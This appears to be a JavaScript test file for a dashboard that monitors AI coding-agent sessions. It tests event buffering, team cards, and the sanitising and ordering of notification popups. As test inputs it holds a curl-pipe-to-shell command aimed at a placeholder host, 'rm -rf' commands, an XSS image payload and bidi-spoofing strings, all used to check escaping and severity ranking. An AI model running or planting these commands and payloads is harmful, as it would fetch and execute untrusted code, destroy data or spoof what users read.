// Task 16 fixes for the defects the M1 evidence suites recorded: the reorder buffer's early flush
// (TEST-O2), the deckd banner during a retry, order handling in the store, the drawer list semantics,
// the Home pointer freeze, team cards and the stylesheet rules for layout and motion.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFile } from 'node:fs/promises'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { runnerImport } from 'vite'
import { createReorderBuffer } from '../../server/ingest/reorder.mjs'
import { bannerFor, initialState, keyAction, reduce } from '../../web/src/state/deck-store.js'

const hub = fileURLToPath(new URL('../..', import.meta.url))
const tick = ms => new Promise(resolve => setTimeout(resolve, ms))
const row = (hookTs, event, session = 's1') => ({ hookTs, hook: { session_id: session, hook_event_name: event } })

async function load(file) {
  const { module } = await runnerImport(path.join(hub, 'web/src', file), { configFile: false, logLevel: 'silent', root: hub })
  return module
}
const render = (Component, props) => renderToStaticMarkup(createElement(Component, props))

test('reorder buffer flushes a session early when Stop, PermissionRequest or Notification is its latest event', t => {
  // Mocked timers: the 20 ms below is virtual time, so a loaded machine cannot let a wall-clock timer run first.
  t.mock.timers.enable({ apis: ['setTimeout', 'setImmediate'] })
  for (const attention of ['Stop', 'PermissionRequest', 'Notification']) {
    const batches = []
    const buffer = createReorderBuffer(batch => batches.push(batch.map(item => item.hook.hook_event_name)), { windowMs: 10_000 })
    try {
      buffer.push(row(1, 'PreToolUse'))
      buffer.push(row(2, attention))
      buffer.push(row(1, 'UserPromptSubmit', 'other'))
      assert.deepEqual(batches, [], 'nothing is delivered from inside push')
      t.mock.timers.tick(20)
      assert.deepEqual(batches, [['PreToolUse', attention]], `${attention} flushes its own session only, well inside the window`)
      t.mock.timers.tick(10_000)
      assert.deepEqual(batches, [['PreToolUse', attention], ['UserPromptSubmit']], 'the other session waits out its window')
    } finally { buffer.close() }
  }
})

test('the early flush keeps hook-time order for rows that arrive together and waits when the attention event is not the latest', t => {
  t.mock.timers.enable({ apis: ['setTimeout', 'setImmediate'] })
  const batches = []
  const buffer = createReorderBuffer(batch => batches.push(batch.map(item => `${item.hookTs}:${item.hook.hook_event_name}`)), { windowMs: 60 })
  try {
    buffer.push(row(5, 'Stop'))
    buffer.push(row(4, 'PostToolUse'))
    buffer.push(row(4, 'PreToolUse'))
    t.mock.timers.tick(20)
    assert.deepEqual(batches, [['4:PreToolUse', '4:PostToolUse', '5:Stop']], 'rows pushed in the same turn flush as one sorted batch')
    buffer.push(row(10, 'PermissionRequest'))
    buffer.push(row(11, 'PostToolUse'))
    t.mock.timers.tick(20)
    assert.equal(batches.length, 1, 'a later hook-time event after the attention event keeps the 250 ms window')
    t.mock.timers.tick(80)
    assert.deepEqual(batches[1], ['10:PermissionRequest', '11:PostToolUse'])
    buffer.push(row(20, 'PreToolUse'))
    t.mock.timers.tick(20)
    assert.equal(batches.length, 2, 'other events wait for the window')
    t.mock.timers.tick(80)
    assert.deepEqual(batches[2], ['20:PreToolUse'])
  } finally { buffer.close() }
})

test('a failing early flush is retried like a timed one instead of throwing out of push', async () => {
  const delivered = []
  let fail = true
  const buffer = createReorderBuffer(batch => {
    if (fail) throw Error('database busy')
    delivered.push(...batch.map(item => item.hook.hook_event_name))
  }, { windowMs: 30 })
  try {
    assert.doesNotThrow(() => buffer.push(row(1, 'Stop')))
    await tick(20)
    assert.deepEqual(delivered, [])
    fail = false
    await tick(250)
    assert.deepEqual(delivered, ['Stop'])
  } finally { buffer.close() }
})

test('the deckd banner stays on screen while a Retry now probe is in flight after an outage', () => {
  const snapshot = health => ({ t: 'snapshot', epoch: 'e', seq: 1, data: { sessions: [], requests: [], health, setup: { firstRunCompletedAt: 1 } } })
  const change = (seq, data) => ({ type: 'message', message: { t: 'health.changed', seq, at: 0, data } })
  let state = reduce(initialState(), { type: 'message', message: snapshot([{ dep: 'deckd', state: 'ok', attempt: 0 }]) })
  assert.equal(bannerFor(state, 0), null)
  state = reduce(state, change(2, { dep: 'deckd', state: 'checking', attempt: 0, nextProbeAt: 0 }))
  assert.equal(bannerFor(state, 0), null, 'a probe with no outage behind it shows no banner')
  state = reduce(state, change(3, { dep: 'deckd', state: 'down', attempt: 2, nextProbeAt: 2000 }))
  assert.deepEqual(bannerFor(state, 0), { kind: 'deckd', attempt: 2, seconds: 2 })
  state = reduce(state, change(4, { dep: 'deckd', state: 'checking', attempt: 2, nextProbeAt: 500 }))
  assert.deepEqual(bannerFor(state, 500), { kind: 'deckd', attempt: 2, seconds: 0 }, 'Retry now keeps the banner')
  state = reduce(state, change(5, { dep: 'deckd', state: 'ok', attempt: 0, nextProbeAt: null }))
  assert.equal(bannerFor(state, 0), null, 'the banner leaves once deckd is back')
  const reloaded = reduce(initialState(), { type: 'message', message: snapshot([{ dep: 'deckd', state: 'down', attempt: 1, nextProbeAt: 0 }]) })
  const probing = reduce(reloaded, change(2, { dep: 'deckd', state: 'checking', attempt: 1, nextProbeAt: 0 }))
  assert.equal(bannerFor(probing, 0)?.kind, 'deckd', 'an outage seen in the snapshot counts too')
})

test('the store applies order.changed and drops a session from the order when it ends', () => {
  const session = (id, state) => ({ id, state, repoId: '/home/you/dev/x' })
  let state = reduce(initialState(), { type: 'message', message: { t: 'snapshot', epoch: 'e', seq: 1, data: { sessions: [session('a', 'running'), session('b', 'idle')], requests: [], order: ['a', 'b'], setup: { firstRunCompletedAt: 1 } } } })
  state = reduce(state, { type: 'message', message: { t: 'order.changed', seq: 2, data: { order: ['b', 'a'] } } })
  assert.deepEqual(state.data.order, ['b', 'a'])
  state = reduce(state, { type: 'message', message: { t: 'session.upserted', seq: 3, data: session('b', 'ended') } })
  assert.deepEqual(state.data.order, ['a'])
  const key = { code: 'Digit1', altKey: true, shiftKey: false, ctrlKey: false, metaKey: false }
  assert.deepEqual(keyAction(key, state), { type: 'navigate', to: '/s/a' }, 'Alt 1 never lands on the ended session')
})

test('drawer rows keep list semantics: no role on the list items', async () => {
  const { DrawerView } = await load('screens/drawer/NeedsYouDrawer.jsx')
  const state = { loaded: true, data: { sessions: [{ id: 's1', repoId: '/home/you/dev/x', branch: 'main' }], repos: [], counts: null,
    requests: [{ id: 'r1', sessionId: 's1', kind: 'permission', tier: 'safe', summary: 'npm test', state: 'open', createdAt: 0 }] } }
  const html = render(DrawerView, { state, now: 1000, navigate: () => {} })
  assert.match(html, /<ul class="drawer-rows"><li class="drawer-row drawer-row--safe" aria-label="npm test" data-request="r1">/)
  assert.doesNotMatch(html, /<li[^>]*role=/)
})

test('a reorder waits while held, for at most 5 s after it arrived, and applies once released', async () => {
  const { heldOrder, HOLD_MS } = await load('screens/home/Home.jsx')
  assert.equal(HOLD_MS, 5000)
  let memo = heldOrder(['a', 'b'], { held: false }, 0)
  assert.deepEqual(memo, { order: ['a', 'b'], shown: ['a', 'b'], since: null, wakeAt: null })
  memo = heldOrder(['a', 'b'], { held: true, ...memo }, 100)
  assert.deepEqual(memo.order, ['a', 'b'])
  memo = heldOrder(['b', 'a'], { held: true, ...memo }, 1000)
  assert.deepEqual([memo.order, memo.since, memo.wakeAt], [['a', 'b'], 1000, 6000], 'held: the grid keeps the order it shows')
  memo = heldOrder(['b', 'a'], { held: true, ...memo }, 5999)
  assert.deepEqual(memo.order, ['a', 'b'])
  const expired = heldOrder(['b', 'a'], { held: true, ...memo }, 6000)
  assert.deepEqual([expired.order, expired.wakeAt], [['b', 'a'], null], 'after 5 s the new order applies even while held')
  const released = heldOrder(['b', 'a'], { held: false, ...memo }, 2000)
  assert.deepEqual(released.order, ['b', 'a'], 'leaving the grid applies the new order at once')
})

const walk = (node, visit) => {
  if (Array.isArray(node)) return node.forEach(child => walk(child, visit))
  if (!node || typeof node !== 'object') return
  if (typeof node.type === 'function') return node.type.name === 'CrewAvatar' ? undefined : walk(node.type(node.props), visit)
  visit(node)
  walk(node.props?.children, visit)
}

function teamState() {
  const repoId = '/home/you/dev/fleetmates'
  const runRef = taskId => ({ repoId, runId: 'r1', taskId })
  const session = (id, state, extra) => ({ id, repoId, origin: 'observed', task: `task ${id}`, state, stateSince: 0, startedAt: 0, changedFiles: [], alive: true, ...extra })
  return {
    loaded: true,
    data: {
      sessions: [
        session('lead', 'running', { role: 'lead', runRef: runRef('T6'), task: 'Phase 2 of the M1 plan' }),
        session('t4', 'needs_approval', { role: 'teammate', runRef: runRef('T4') }),
        session('t5', 'needs_approval', { role: 'teammate', runRef: runRef('T5') }),
        session('solo', 'running', { task: 'solo work' })
      ],
      requests: [
        { id: 'q5', sessionId: 't5', kind: 'permission', tier: 'safe', summary: 'npm test', state: 'open', createdAt: 20, taskId: 'T5' },
        { id: 'q4', sessionId: 't4', kind: 'permission', tier: 'caution', summary: 'npm install commander@14', state: 'open', createdAt: 10, taskId: 'T4' }
      ],
      runs: [{ repoId, runId: 'r1', leadSessionId: 'lead', derivedPhase: 2, readError: null,
        tasks: [{ id: 'T3', state: 'done' }, { id: 'T4', state: 'running' }, { id: 'T5', state: 'running' }, { id: 'T7', state: 'pending' }],
        teammates: [{ taskId: 'T3', state: 'done' }, { taskId: 'T4', state: 'running' }, { taskId: 'T5', state: 'running' }, { taskId: 'T7', state: 'pending' }],
        gates: { 1: { verdict: 'PASS', phase: 1, recordedAt: 5 } } }],
      repos: [{ id: repoId, name: 'fleetmates', crew: { slot: 1, seed: 'fleetmates', hat: 'none' } }],
      order: ['lead', 'solo'], counts: null
    }
  }
}

test('team cards render from the snapshot runs: tiles, pill, phase, footer and Review N opening the drawer on the oldest request', async () => {
  const { HomeView } = await load('screens/home/Home.jsx')
  const overlays = []
  const props = { state: teamState(), now: 1000, navigate: () => {}, onOverlay: (overlay, detail) => overlays.push([overlay, detail]) }
  const html = render(HomeView, props)
  const tiles = [...html.matchAll(/<li class="team-tile team-tile--(\w+)">([^<]*)<\/li>/g)].map(match => `${match[1]}:${match[2]}`)
  assert.deepEqual(tiles, ['lead:lead · T6', 'done:T3 · done', 'needs:T4 · needs you', 'needs:T5 · needs you'])
  assert.match(html, /2 of 4 need you/)
  assert.match(html, /Phase 2/)
  assert.match(html, /Tasks 1\/4/)
  assert.match(html, /Gate 1 passed/)
  assert.match(html, /task T4 · npm install commander@14/)
  assert.equal((html.match(/<article/g) ?? []).length, 2, 'the team card replaces its lead\'s own card; teammates get none')
  assert.ok(html.indexOf('card-title-team-') < html.indexOf('card-title-solo'), 'the team card needing you sorts ahead of the running session')
  const buttons = []
  walk(HomeView(props), node => { if (node.type === 'button' && node.props.className?.includes('amber-outline')) buttons.push(node) })
  assert.equal(buttons.length, 1)
  buttons[0].props.onClick()
  assert.deepEqual(overlays, [['drawer', { request: 'q4' }]])
})

test('team card text renders as text and a lone active run keeps Home out of calm', async () => {
  const { HomeView } = await load('screens/home/Home.jsx')
  const state = teamState()
  state.data.sessions = []
  state.data.requests = []
  state.data.order = []
  state.data.runs[0].runId = '<img src=x onerror=alert(1)>'
  state.data.runs[0].teammates[1].taskId = 'T4\u202e'
  const html = render(HomeView, { state, now: 1000, navigate: () => {} })
  assert.doesNotMatch(html, /calm-headline/)
  assert.doesNotMatch(html, /<img/)
  assert.doesNotMatch(html, /\u202e/u, 'bidi controls in a task id are shown, not applied')
  assert.match(html, /T4 · running|T4&lt;U\+202E&gt; · running/)
})

test('a teammate that is waiting marks its tile, and the team reads as the kind of wait', async () => {
  const { teamCards } = await load('screens/home/Home.jsx')
  const run = { repoId: '/r', runId: 'r1', leadSessionId: null, tasks: [], teammates: [{ taskId: 'T2', state: 'running' }, { taskId: 'T3', state: 'pending' }] }
  const mate = state => [{ id: 'm', state, role: 'teammate', runRef: { repoId: '/r', runId: 'r1', taskId: 'T2' } }]
  const [asked] = teamCards([run], mate('asked_you'), [])
  assert.deepEqual([asked.tiles.map(tile => `${tile.taskId}:${tile.kind}`), asked.state, asked.needs], [['T2:needs'], 'asked_you', 1], 'pending tasks get no tile')
  assert.equal(teamCards([run], mate('needs_approval'), [])[0].state, 'needs_approval')
  assert.deepEqual(teamCards([run], mate('running'), [])[0].tiles.map(tile => tile.kind), ['running'])
})

test('Review N opens the drawer on the named request', async () => {
  const { openOverlay, drawerFocusTarget } = await load('screens/drawer/NeedsYouDrawer.jsx')
  const calls = []
  const env = {
    location: { pathname: '/', search: '' },
    history: { pushState: (state, _, url) => calls.push(['push', state, url]) },
    PopStateEvent: class { constructor(type, init) { this.state = init.state } },
    dispatchEvent: event => calls.push(['pop', event.state])
  }
  openOverlay('drawer', env, { request: 'q4' })
  assert.deepEqual(calls, [['push', { overlay: 'drawer', request: 'q4' }, '/'], ['pop', { overlay: 'drawer', request: 'q4' }]])
  const link = id => ({ id })
  const rows = ['q5', 'q4'].map(id => ({ getAttribute: () => id, querySelector: () => link(id) }))
  const panel = { querySelectorAll: () => rows, querySelector: selector => selector === '.drawer-row a' ? link('q5') : link('close') }
  assert.deepEqual(drawerFocusTarget(panel, 'q4'), { id: 'q4' })
  assert.deepEqual(drawerFocusTarget(panel, null), { id: 'q5' })
  assert.deepEqual(drawerFocusTarget(panel, 'gone'), { id: 'q5' })
})

// Source-text checks strip comments first, so a comment naming a rule cannot satisfy them.
const css = async name => (await readFile(path.join(hub, 'web/src/styles', name), 'utf8')).replace(/\/\*[\s\S]*?\*\//g, '')
const rule = (source, selector) => source.match(new RegExp(`(?:^|\\n)\\s*${selector.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\s*\\{([^}]*)\\}`))?.[1] ?? ''

test('stylesheets: the fleet scrolls under the header, the drawer animates in, and the reduced-motion ring is inset', async () => {
  const observe = await css('observe.css')
  assert.match(rule(observe, '.home-fleet'), /overflow-y:\s*auto/)
  assert.match(rule(observe, '.home:not(.home--calm)'), /height:\s*100%/)
  assert.match(rule(await css('shell.css'), '.drawer'), /animation:\s*deck-drawer-in\b/)
  // The pulse animation overrides this while it runs; reduced motion stops it and this inset line shows.
  assert.match(rule(await css('components.css'), '.session-card.motion-pulse'), /box-shadow:\s*inset\b/)
})

test('notify-send gets a title and body stripped of controls and bidi, capped, then escaped (08-security 4.9)', async () => {
  const { createNotifier } = await import('../../server/adapters/notify.mjs')
  const calls = []
  // notify-send is the linux notifier; the win32 one is in-tab only and runs nothing, so the platform is pinned.
  const notifier = createNotifier({ platform: 'linux', run: async (command, args) => { calls.push(args)
    return { ok: true, exitCode: 0, stdout: '7\n' } } })
  const popup = async (title, body) => {
    calls.length = 0
    await notifier.popup({ title, body })
    assert.equal(calls[0].at(-3), '--', '-- ends option parsing before title and body')
    return calls[0].slice(-2)
  }
  let [title, body] = await popup('a\u202eb\u2066c\x1b[31m\r\nd\u0085e<i>&"\'', 'ok')
  assert.equal(title, 'abc[31mde&lt;i&gt;&amp;&quot;&#39;', 'title: C0 (line breaks too), C1 and bidi removed, markup escaped')
  ;[title, body] = await popup('t', 'one\r\n\x1b[2Ktwo\u0085\u200f<b>\u202a')
  assert.equal(body, 'one\n[2Ktwo&lt;b&gt;', 'body: line feeds kept between lines, other controls and bidi removed')
  ;[title] = await popup('\x1b'.repeat(50) + 'x'.repeat(79) + '&y', 'b')
  assert.equal(title, `${'x'.repeat(79)}…`, 'the 80-character title cap counts characters after stripping')
  ;[title] = await popup(`${'x'.repeat(78)}&${'y'.repeat(5)}`, 'b')
  assert.equal(title, `${'x'.repeat(78)}&amp;…`, 'escaping after the cap never cuts an entity')
  ;[title] = await popup('x'.repeat(80), 'b')
  assert.equal(title, 'x'.repeat(80))
  ;[, body] = await popup('t', `${'y'.repeat(198)}<${'z'.repeat(60)}`)
  assert.equal(body, `${'y'.repeat(198)}&lt;…`, 'the body caps at 200 characters')
  ;[, body] = await popup('t', 'y'.repeat(200))
  assert.equal(body, 'y'.repeat(200))
})

test('oneLine folds line breaks and caps a summary at 4000 characters', async () => {
  const { oneLine } = await import('../../server/machines/request.mjs')
  assert.equal(oneLine('  a\n  b\r\nc  '), 'a ↵ b ↵ c')
  assert.equal(oneLine('x'.repeat(4000)), 'x'.repeat(4000))
  assert.equal(oneLine('x'.repeat(5000)), `${'x'.repeat(3999)}…`)
})

test('the hook latency budget is judged only on the early-flushed events (TEST-O2)', async () => {
  const { budgetVerdict } = await import('../perf/hook-latency.mjs')
  const many = (event, total, n = 20) => Array.from({ length: n }, () => ({ event, total }))
  assert.equal(budgetVerdict(many('PostToolUse', 10)).withinBudget, false, 'no early-flushed sample: no verdict to pass')
  assert.equal(budgetVerdict(many('PostToolUse', 10)).total, null)
  assert.equal(budgetVerdict([...many('PermissionRequest', 50), ...many('Stop', 350)]).withinBudget, false, 'early p95 over budget')
  const under = budgetVerdict([...many('PermissionRequest', 50), ...many('Notification', 60), ...many('PostToolUse', 400, 100)])
  assert.deepEqual([under.withinBudget, under.total.n, under.total.max], [true, 40, 60], 'PostToolUse samples are ignored')
  assert.equal(budgetVerdict(many('Stop', 300)).withinBudget, false, 'the budget is strict: p95 must be under 300')
})

test('team card text goes through titleText and shown, and the needs count includes a waiting lead', async () => {
  const { HomeView } = await load('screens/home/Home.jsx')
  const state = teamState()
  const lead = state.data.sessions[0]
  lead.task = 'Phase\u202e2'
  lead.state = 'needs_approval'
  state.data.requests.push({ id: 'q0', sessionId: 'lead', kind: 'permission', tier: 'caution', summary: 'rm\u202e -rf', state: 'open', createdAt: 1 })
  const html = render(HomeView, { state, now: 1000, navigate: () => {} })
  assert.match(html, /<bdi>Phase&lt;U\+202E&gt;2<\/bdi>/, 'the team title renders its bidi control as a token')
  assert.match(html, /<code class="request-command">rm&lt;U\+202E&gt; -rf<\/code>/, 'a summary without a task id renders its control as a token')
  assert.doesNotMatch(html, /\u202e/u)
  assert.match(html, /3 of 4 need you/, 'lead, T4 and T5 all need you')
  const { teamCards } = await load('screens/home/Home.jsx')
  const run = { repoId: '/r', runId: 'r1', leadSessionId: 'lead', tasks: [], teammates: [{ taskId: 'T4', state: 'running' }] }
  const [attributed] = teamCards([run], [{ id: 'lead', state: 'needs_approval', role: 'lead', runRef: { repoId: '/r', runId: 'r1', taskId: 'T6' } }],
    [{ id: 'r', sessionId: 'lead', kind: 'permission', state: 'open', createdAt: 1, taskId: 'T4' }])
  assert.equal(attributed.needs, 1, 'a lead waiting only on a teammate\'s request is not counted twice')
})

test('team cards: "+N" past five tiles, the latest gate failed, and a question-only wait reads asked_you', async () => {
  const { HomeView } = await load('screens/home/Home.jsx')
  const state = teamState()
  const run = state.data.runs[0]
  run.teammates = ['T1', 'T2', 'T3', 'T4', 'T5', 'T7'].map(taskId => ({ taskId, state: 'running' }))
  run.gates = { 1: { verdict: 'PASS', phase: 1, recordedAt: 5 }, 2: { verdict: 'FAIL', phase: 2, recordedAt: 9 } }
  state.data.sessions = state.data.sessions.filter(row => row.id === 'lead')
  state.data.requests = [{ id: 'q', sessionId: 'lead', kind: 'question', tier: null, summary: 'Which format?', state: 'open', createdAt: 1 }]
  const html = render(HomeView, { state, now: 1000, navigate: () => {} })
  const tiles = [...html.matchAll(/<li class="team-tile team-tile--(\w+)">([^<]*)<\/li>/g)].map(match => match[2])
  assert.deepEqual(tiles, ['lead · T6', 'T1 · running', 'T2 · running', 'T3 · running', '+3'])
  assert.match(html, /Gate 2 failed/)
  assert.match(html, /session-card--team session-card--asked-you/)
})

test('a lead needs you by its state when it has no open request of its own', async () => {
  const { teamCards } = await load('screens/home/Home.jsx')
  const run = { repoId: '/r', runId: 'r1', leadSessionId: 'lead', tasks: [], teammates: [{ taskId: 'T4', state: 'running' }] }
  const lead = { id: 'lead', state: 'needs_approval', role: 'lead', runRef: { repoId: '/r', runId: 'r1', taskId: 'T6' } }
  const [alone] = teamCards([{ ...run, teammates: [] }], [lead], [])
  assert.deepEqual([alone.needs, alone.state], [1, 'needs_approval'], 'no request rows: the lead\'s state still needs you')
  const mate = { id: 't4', state: 'needs_approval', role: 'teammate', runRef: { repoId: '/r', runId: 'r1', taskId: 'T4' } }
  const [both] = teamCards([run], [lead, mate], [{ id: 'q', sessionId: 't4', kind: 'permission', state: 'open', createdAt: 1, taskId: 'T4' }])
  assert.deepEqual([both.needs, both.total], [2, 2], 'a teammate\'s open request does not stop the lead counting by state')
})

test('notification text strips ALM and LRM in both the title and the body', async () => {
  const { notificationText, TITLE_MAX, BODY_MAX } = await import('../../server/adapters/notify.mjs')
  assert.equal(notificationText('a\u061cb\u200ec', TITLE_MAX), 'abc')
  assert.equal(notificationText('a\u061cb\u200ec\nd', BODY_MAX, { keepLineFeeds: true }), 'abc\nd')
})

test('a grouped popup body keeps room for its "+N more" line, so the whole body fits 200 characters', async () => {
  const { requestPopupText } = await import('../../server/machines/notification.mjs')
  const { body } = requestPopupText('t', Array.from({ length: 9 }, (_, i) => ({ summary: String(i).repeat(300), tier: 'safe' })), true)
  const shown = Array.from({ length: 5 }, (_, i) => `safe · ${String(i).repeat(23)}…`)
  assert.deepEqual(body.split('\n'), ['Answer in your terminal', ...shown, '+4 more · safe'])
  assert.ok(Array.from(body).length <= 200)
})

test('a done or crash popup keeps its own words after a long task', async () => {
  const { terminalPopupTitle } = await import('../../server/machines/notification.mjs')
  const task = 'y'.repeat(88)
  assert.equal(terminalPopupTitle(task, 'done'), `made port · ${'y'.repeat(67)}…`)
  assert.equal(terminalPopupTitle(task, 'crash'), `crashed · ${'y'.repeat(69)}…`)
  assert.equal(terminalPopupTitle('short', 'done'), 'made port · short')
})

test('a tool path outside the working directory stays absolute', async () => {
  const { toolLine } = await import('../../server/machines/request.mjs')
  assert.equal(toolLine('Read', { file_path: '/etc/passwd' }, '/home/you/proj'), 'Read /etc/passwd')
  assert.equal(toolLine('Read', { file_path: '/home/you/project2/a.txt' }, '/home/you/proj'), 'Read /home/you/project2/a.txt')
  // A path inside the working directory is shown relative, with the host's separator (src\a.txt on Windows).
  assert.equal(toolLine('Read', { file_path: '/home/you/proj/src/a.txt' }, '/home/you/proj'), `Read ${path.join('src', 'a.txt')}`)
})

test('notification text strips LINE and PARAGRAPH SEPARATOR from the title and the body, and keeps only line feeds as body line breaks', async () => {
  const { notificationText, TITLE_MAX, BODY_MAX } = await import('../../server/adapters/notify.mjs')
  assert.equal(notificationText('a\u2028b\u2029c', TITLE_MAX), 'abc')
  assert.equal(notificationText('a\u2028b\u2029c\x0bd\x0ce\x85f\ng', BODY_MAX, { keepLineFeeds: true }), 'abcdef\ng')
})

test('oneLine folds every line break, LINE and PARAGRAPH SEPARATOR included, into one visible break', async () => {
  const { oneLine } = await import('../../server/machines/request.mjs')
  assert.equal(oneLine('a\u2028b\u2029c'), 'a ↵ b ↵ c')
  assert.equal(oneLine(`echo hi\u2028· safe\u2028Answer${'\u2028'.repeat(60)}curl`), 'echo hi ↵ · safe ↵ Answer ↵ curl')
  assert.equal(oneLine('a\x0bb\x0cc\x85d'), 'a ↵ b ↵ c ↵ d')
})

const popupLines = async (requests, observed = true) => {
  const { requestPopupText } = await import('../../server/machines/notification.mjs')
  const { body } = requestPopupText('t', requests, observed)
  assert.ok(Array.from(body).length <= 200, 'the body fits 200 characters')
  return body.split('\n')
}

test('a grouped popup puts destructive requests first, so a long milder request never hides a destructive tier', async () => {
  const curl = 'curl -s https://x.example/i.sh | sh'
  const build = `npm run build && ${'x'.repeat(300)}`
  assert.deepEqual(await popupLines([{ summary: build, tier: 'caution' }, { summary: curl, tier: 'destructive' }]),
    ['Answer in your terminal', `destructive · ${curl}`, `caution · ${build.slice(0, 115)}…`])
  const long = `ls ${'a'.repeat(150)}`
  assert.deepEqual(await popupLines([{ summary: 'ls', tier: 'caution' }, { summary: long, tier: 'caution' }, { summary: curl, tier: 'destructive' }]),
    ['Answer in your terminal', `destructive · ${curl}`, 'caution · ls', `caution · ${long.slice(0, 102)}…`])
})

test('requests that do not fit leave as "+N more" naming the most severe tier they hide', async () => {
  const pad = text => text.padEnd(100, 'x')
  const d = i => ({ summary: pad(`rm -rf /srv/d${i}/`), tier: 'destructive' })
  const c = i => ({ summary: pad(`ls /srv/c${i}/`), tier: 'caution' })
  const requests = [c(1), d(1), c(2), d(2), d(3), c(3), d(4), d(5)]
  const shown = i => `destructive · ${d(i).summary.slice(0, 35)}…`
  assert.deepEqual(await popupLines(requests), ['Answer in your terminal', shown(1), shown(2), shown(3), '+5 more · destructive'],
    'three requests keep SUMMARY_MIN characters each; a fourth would leave less than that')
  assert.deepEqual((await popupLines([c(1), c(2), c(3), c(4), c(5), c(6), c(7), c(8), { summary: pad('untiered'), tier: null }])).slice(-1),
    ['+5 more · caution'])
  assert.deepEqual(await popupLines([d(1), d(2), d(3), c(1), d(4)]),
    ['Answer in your terminal', ...[1, 2, 3, 4].map(i => `destructive · ${d(i).summary.slice(0, 23)}…`), '+1 more · caution'],
    'the hidden request is the one the sorted list leaves out, not the one at that arrival index')
})

test('a caution request that arrives after eight long safe ones is shown first', async () => {
  const safe = i => ({ summary: `cat /srv/s${i}/`.padEnd(100, 'x'), tier: 'safe' })
  assert.deepEqual(await popupLines([...[1, 2, 3, 4, 5, 6, 7, 8].map(safe), { summary: 'npm publish', tier: 'caution' }]),
    ['Answer in your terminal', 'caution · npm publish', ...[1, 2, 3, 4].map(i => `safe · ${safe(i).summary.slice(0, 26)}…`), '+4 more · safe'])
})

test('a summary shorter than SUMMARY_MIN costs only its own length when choosing how many requests to show', async () => {
  const requests = Array.from({ length: 12 }, (_, i) => ({ summary: `ls ${i}`, tier: 'caution' }))
  assert.deepEqual(await popupLines(requests),
    ['Answer in your terminal', ...Array.from({ length: 10 }, (_, i) => `caution · ls ${i}`), '+2 more · caution'])
})

test('clipText returns nothing for a cap of zero or below', async () => {
  const { clipText } = await import('../../server/adapters/notify.mjs')
  assert.equal(clipText('abc', 0), '')
  assert.equal(clipText('abc', -3), '')
})

test('every popup line starts with the deck\'s own words: the hint first, then "<tier> · " before agent text, and titles lead with the deck\'s phrase', async () => {
  const { requestPopupText, terminalPopupTitle } = await import('../../server/machines/notification.mjs')
  const one = requestPopupText('y'.repeat(88), [{ summary: 'rm -rf x', tier: 'destructive' }], true)
  assert.deepEqual(one, { title: `needs you · destructive · ${'y'.repeat(53)}…`, body: 'Answer in your terminal\ndestructive · rm -rf x' })
  assert.equal(requestPopupText('y'.repeat(88), [{ summary: 'a' }, { summary: 'b' }], false).title, `needs you (2 requests) · ${'y'.repeat(54)}…`)
  assert.equal(requestPopupText('', [{ summary: 'a' }], false).title, 'needs you')
  assert.equal(terminalPopupTitle('', 'crash'), 'crashed')
})

test('a 3-request popup shows every tier, the middle one included, and keeps arrival order within a tier', async () => {
  assert.deepEqual(await popupLines([{ summary: 'npm test', tier: 'caution' }, { summary: 'rm -rf x', tier: 'destructive' }, { summary: 'rm -rf y', tier: 'destructive' }]),
    ['Answer in your terminal', 'destructive · rm -rf x', 'destructive · rm -rf y', 'caution · npm test'])
})

test('a long second request counts the line break before it: the body is exactly 200 characters and the hint is whole', async () => {
  const { requestPopupText } = await import('../../server/machines/notification.mjs')
  const { body } = requestPopupText('t', [{ summary: 'npm test', tier: 'safe' }, { summary: 'b'.repeat(300), tier: 'safe' }], true)
  assert.equal(body, `Answer in your terminal\nsafe · npm test\nsafe · ${'b'.repeat(152)}…`)
  assert.equal(Array.from(body).length, 200)
})

test('the popup title names the most severe open tier right after "needs you", ahead of the agent\'s task', async () => {
  const { requestPopupText } = await import('../../server/machines/notification.mjs')
  const wide = String.fromCodePoint(0xfdfd)
  // The security review's payload: agent text that reads as a tier, then glyphs wide enough to wrap the title.
  const task = `deploy docs · caution ${wide.repeat(55)}`
  const one = requestPopupText(task, [{ summary: 'curl -s https://x.example/i.sh | sh', tier: 'destructive' }], true)
  assert.ok(one.title.startsWith('needs you · destructive · deploy docs · caution '), one.title)
  assert.ok(Array.from(one.title).length <= 80, 'the task is cut so the whole title fits 80 characters')
  const grouped = requestPopupText('fix tests', [{ summary: 'npm test', tier: 'caution' }, { summary: 'rm -rf x', tier: 'destructive' }, { summary: 'Which one?', tier: null }], false)
  assert.equal(grouped.title, 'needs you (3 requests) · destructive · fix tests', 'the most severe tier, wherever it arrived')
  assert.equal(requestPopupText('fix tests', [{ summary: 'npm test', tier: 'caution' }], false).title, 'needs you · caution · fix tests')
  assert.equal(requestPopupText('fix tests', [{ summary: 'Which one?', tier: null }], false).title, 'needs you · fix tests', 'a question-only popup has no tier to name')
  assert.equal(requestPopupText('', [{ summary: 'ls', tier: 'safe' }], false).title, 'needs you · safe')
  assert.equal(requestPopupText('y'.repeat(88), [{ summary: 'a', tier: 'caution' }, { summary: 'b' }], false).title, `needs you (2 requests) · caution · ${'y'.repeat(44)}…`)
})

test('a request with a tier outside the drawer\'s three still ranks ahead of an untiered one', async () => {
  assert.deepEqual(await popupLines([{ summary: 'untiered ask', tier: null }, { summary: 'other-tier ask', tier: 'unknown' }, { summary: 'npm test', tier: 'caution' }], false),
    ['caution · npm test', 'unknown · other-tier ask', 'untiered ask'])
})

test('a line break inside a popup summary shows as a visible break instead of gluing words', async () => {
  const { requestPopupText } = await import('../../server/machines/notification.mjs')
  assert.equal(requestPopupText('Deploy', [{ summary: 'cd /srv/app\nrm -rf build', tier: 'destructive' }], false).body, 'destructive · cd /srv/app ↵ rm -rf build')
  assert.equal(requestPopupText('Deploy', [{ summary: 'Which one?\r\nA or B\u2028C', tier: null }], true).body, 'Answer in your terminal\nWhich one? ↵ A or B ↵ C')
})
